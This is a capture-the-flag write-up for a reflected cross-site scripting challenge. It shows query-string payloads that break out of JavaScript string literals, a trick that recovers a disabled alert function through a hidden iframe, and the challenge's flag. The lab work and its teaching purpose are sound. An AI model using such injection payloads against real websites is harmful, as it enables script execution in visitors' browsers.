# Excess Ess [51]
> This is some kind of reverse captcha to tell if the visitor is indeed a robot. Can you complete it?
>
> Service: [http://xss1.alieni.se:2999/](http://xss1.alieni.se:2999/)

We are presented with a page instructing us to pop an alert box on the page by injecting some content through a query parameter called 'xss'. If we click on the example of xss=hello and view the page source, we see that it injects our input into the context of a string variable inside of a script tag.
```
<script>var x ='hello'; var y = `hello`; var z = "hello";</script>
```
Each of the variables use different types of quotations, but that doesn't matter because we only need one of them anyways. So lets start by submiting a single quote in order to get some javascript execution. Note that adding the comment at the end means we don't have to worry about our injected text causing the later parts of the script to throw syntax errors.
```
.../?xss=hello'; alert(1); //
```
This seems promising, but also not quite right.

![Excess Ess 1](https://i.imgur.com/Vd50TTz.png)

This is a prompt box, not an alert. And when we try to submit the url it doesn't work. Scanning the page source for anything javascript or prompt related, we find this tag:
```
<script src="/static/no_alert_for_you.js"></script>
```
And of course this script is turning the alert box into a prompt...

![Excess Ess 2](https://i.imgur.com/kIjlTAB.png?1)

So in order to get the correct alert to show up we have to somehow retrieve the original alert function first before we can call it. A quick google (or duckduckgo for those not wishing to land on an FBI watch list) search reveals that one way, or really the only way of doing this is by creating an iframe and then retrieving the function out of the `contentWindow` object of that iframe. Our payload then becomes something like this.

```
var f = document.createElement('iframe');
f.style.display='none';  // Hiding the iframe is completely optional
document.body.append(f);
window.alert = f.contentWindow.alert;
document.body.removeChild(f); // Removing the iframe is also optional
window.alert(1);
```

Or if we slap it into the query string:
```
.../?xss=hello'; var f = document.createElement('iframe'); document.body.append(f); window.alert = f.contentWindow.alert; window.alert(1); //
```
And this time we actually see the correct alert.

![Excess Ess 3](https://i.imgur.com/GVmvkMf.png)

We submit the full url of this payload to the page and get the flag: `sctf{cr0ss_s1te_n0scr1ptinG}`
